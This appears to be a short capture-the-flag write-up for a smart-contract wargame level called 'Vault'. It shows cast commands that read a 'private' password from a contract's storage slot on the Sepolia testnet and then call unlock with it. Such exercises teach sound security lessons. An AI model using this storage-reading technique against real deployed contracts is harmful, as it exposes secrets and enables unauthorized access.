# Vault Solution

Run to retrieve the `password`:

```bash
cast storage <instanceAddress> 0x1 --rpc-url $SEPOLIA_RPC_URL
# 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

Run:

```bash
cast send <instanceAddress> "unlock(bytes32)" <password> --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
# cast send <instanceAddress> "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
